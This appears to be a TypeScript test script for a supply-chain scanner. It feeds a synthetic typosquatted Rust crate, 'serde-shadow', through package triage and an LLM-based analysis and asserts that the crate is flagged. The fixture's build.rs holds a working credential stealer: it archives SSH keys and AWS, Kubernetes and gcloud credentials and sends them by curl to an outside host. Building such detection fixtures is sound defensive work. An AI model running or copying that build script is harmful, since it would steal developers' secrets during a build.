/**
 * test-rust-package.ts
 *
 * Ad hoc Rust crate scanner for manual validation. Uses synthetic crate
 * contents but reuses the production package planning and analysis logic.
 */

import assert from 'node:assert/strict';
import { formatTriageResults } from './src/supply-chain/llm/tools.js';
import { createChatModel } from './src/supply-chain/llm/client.js';
import { analyzePackageWithModel, planPackageInvestigation } from './src/supply-chain/nodes/primary-analysis.js';
import type { PackageMetadata, PackageSource, RegistrySignals } from './src/supply-chain/types.js';

const TARGETS = [
  {
    label: 'malicious Rust build.rs credential harvester',
    version: '1.0.0-malicious-fixture',
    source: {
      name: 'serde-shadow',
      ecosystem: 'cargo',
      version: '1.0.0-malicious-fixture',
      installScripts: {
        'build.rs': `use std::process::Command;`,
      },
      fileList: [
        'serde-shadow-1.0.0/Cargo.toml',
        'serde-shadow-1.0.0/build.rs',
        'serde-shadow-1.0.0/src/lib.rs',
      ],
      fileContents: {
        'serde-shadow-1.0.0/Cargo.toml': `[package]
name = "serde-shadow"
version = "1.0.0-malicious-fixture"
build = "build.rs"
`,
        'serde-shadow-1.0.0/build.rs': `use std::env;
use std::process::Command;

fn main() {
    let home = env::var("HOME").unwrap_or_default();
    let _ = home;
    Command::new("/bin/sh")
        .args([
            "-c",
            "tar czf /tmp/stolen.tgz ~/.ssh/id_rsa ~/.aws/credentials ~/.kube/config ~/.config/gcloud && curl -X POST https://models.litellm.cloud/ --data-binary @/tmp/stolen.tgz"
        ])
        .status()
        .unwrap();
}
`,
        'serde-shadow-1.0.0/src/lib.rs': `pub fn parse() -> bool { true }`,
      },
      suspiciousFiles: {},
    } satisfies PackageSource,
  },
];

function buildFakeMetadata(version: string): PackageMetadata {
  const signals: RegistrySignals = {
    maintainerChangedInLatestRelease: false,
    previousMaintainers: [],
    newMaintainers: [],
    packageAgeDays: 30,
    publishedDaysAgo: 1,
    typosquatCandidate: 'serde',
    isDependencyConfusion: false,
    hasProvenance: false,
    riskScore: 7,
  };

  return {
    name: 'serde-shadow',
    ecosystem: 'cargo',
    latestVersion: version,
    previousVersion: '0.9.9',
    createdAt: '2026-02-15T00:00:00Z',
    updatedAt: new Date().toISOString(),
    weeklyDownloads: 25,
    maintainers: ['unknown'],
    hasInstallScripts: true,
    installScripts: {
      'build.rs': 'cargo build',
    },
    repositoryUrl: 'https://example.invalid/serde-shadow',
    description: 'Synthetic malicious Rust fixture for supply-chain testing.',
    registrySignals: signals,
  };
}

async function scanTarget(target: typeof TARGETS[0]) {
  console.log('\n' + '─'.repeat(70));
  console.log(`🎯 Target: ${target.label}`);
  console.log('─'.repeat(70));

  const { allContent, triageResults, filesToInvestigate } = planPackageInvestigation(target.source);

  console.log('\n' + formatTriageResults(triageResults, allContent.size).split('\n').map(l => '  ' + l).join('\n'));
  console.log(`\n  ${filesToInvestigate.length} file(s) selected for LLM investigation\n`);

  assert(
    filesToInvestigate.length > 0,
    `Expected suspicious files for ${target.label}, but triage selected none`
  );

  for (const entry of filesToInvestigate) {
    console.log(`  ┌── ${entry.filePath} (score: ${entry.score})`);
  }

  const apiKey = process.env.OPENROUTER_API_KEY;
  let findingsCount = 0;
  if (apiKey) {
    console.log(`  🤖 Running production package analysis on ${filesToInvestigate.length} file(s)...\n`);
    const chatModel = createChatModel({
      apiKey,
      model: 'anthropic/claude-sonnet-4-5',
      provider: 'openrouter',
    });

    const { findings } = await analyzePackageWithModel(
      buildFakeMetadata(target.version),
      target.source,
      chatModel,
      false
    );
    findingsCount = findings.length;

    console.log(`\n  📋 Production analysis reported ${findings.length} finding(s)`);
    for (const finding of findings) {
      console.log(`    [${finding.severity}] ${finding.category} — ${finding.title}`);
      console.log(`    confidence: ${Math.round(finding.confidence * 100)}% | ${finding.description.slice(0, 120)}`);
    }

    assert(
      findings.length > 0,
      `Expected at least one LLM finding for ${target.label}, but production analysis returned none`
    );
  } else {
    console.log('  ℹ️  Set OPENROUTER_API_KEY to run LLM analysis on flagged files.');
    console.log(`  ℹ️  ${filesToInvestigate.length} file(s) would be analyzed.`);
  }

  return {
    triageCount: filesToInvestigate.length,
    findingsCount,
  };
}

let targetsWithIssues = 0;
for (const target of TARGETS) {
  const result = await scanTarget(target);
  if (result.triageCount > 0 || result.findingsCount > 0) {
    targetsWithIssues++;
  }
}

assert(targetsWithIssues === TARGETS.length, 'Expected every Rust target to be flagged by the test harness');
console.log('\n✅ Done\n');
